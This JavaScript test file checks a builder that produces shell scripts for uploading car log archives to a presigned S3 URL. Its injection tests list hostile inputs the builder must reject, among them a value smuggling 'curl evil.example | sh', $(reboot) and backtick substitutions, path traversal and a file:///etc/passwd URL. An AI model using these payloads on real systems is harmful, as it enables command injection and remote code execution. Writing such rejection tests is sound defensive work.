// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
// SPDX-License-Identifier: Apache-2.0

import { buildCarLogUploadScript } from '../ssmScripts.js';

const URL = 'https://bucket.s3.amazonaws.com/staging/car/job.tar.gz?X-Amz-Signature=abc123&X-Amz-Expires=900';
const MODEL_ID = 'abcdefghij12345';

describe('buildCarLogUploadScript', () => {
  it('selects bags by model id and time and uploads with a PUT', () => {
    const script = buildCarLogUploadScript({
      uploadUrl: URL,
      modelId: MODEL_ID,
      laterThan: new Date('2025-01-02T03:04:05.678Z'),
    }).join('\n');

    expect(script).toContain("-newermt '2025-01-02 03:04:05 UTC'");
    expect(script).toContain(`-name '*_${MODEL_ID}-*'`);
    expect(script).toContain('/logging_pkg/stop_logging');
    expect(script).toContain(`-T "$ARCHIVE.gz" '${URL}'`);
    expect(script).toContain('Content-Type: application/gzip');
  });

  it('falls back to the racer name when there is no model id', () => {
    const script = buildCarLogUploadScript({ uploadUrl: URL, racerName: 'Alice-1_x' }).join('\n');

    expect(script).toContain("-name 'Alice-1_x_*'");
    expect(script).not.toContain('-newermt');
  });

  it('prefers the model id over a racer name', () => {
    const script = buildCarLogUploadScript({ uploadUrl: URL, modelId: MODEL_ID, racerName: 'Alice' }).join('\n');

    expect(script).toContain(`*_${MODEL_ID}-*`);
    expect(script).not.toContain('Alice');
  });

  it('needs a model id or racer name', () => {
    expect(() => buildCarLogUploadScript({ uploadUrl: URL })).toThrow();
  });

  describe('injection attempts', () => {
    const payloads = [
      "x'; curl evil.example | sh; echo '",
      '$(reboot)',
      '`reboot`',
      'a"; reboot; "',
      'a\nreboot',
      'a b',
      '../../etc',
      'a;b',
      '*',
      '',
    ];

    it.each(payloads)('rejects racer name %j', (racerName) => {
      expect(() => buildCarLogUploadScript({ uploadUrl: URL, racerName })).toThrow();
    });

    it.each([...payloads, 'abcdefghij1234', 'abcdefghij123456'])('rejects model id %j', (modelId) => {
      expect(() => buildCarLogUploadScript({ uploadUrl: URL, modelId })).toThrow();
    });

    it.each([
      "https://x.example/a'b",
      'https://x.example/a b',
      'https://x.example/a\nb',
      'https://x.example/`reboot`',
      'https://x.example/a"b',
      'https://x.example/a\\b',
      'http://x.example/a',
      "file:///etc/passwd'",
    ])('rejects upload url %j', (uploadUrl) => {
      expect(() => buildCarLogUploadScript({ uploadUrl, modelId: MODEL_ID })).toThrow();
    });

    it('rejects an invalid date', () => {
      expect(() => buildCarLogUploadScript({ uploadUrl: URL, modelId: MODEL_ID, laterThan: new Date('x') })).toThrow();
    });
  });
});
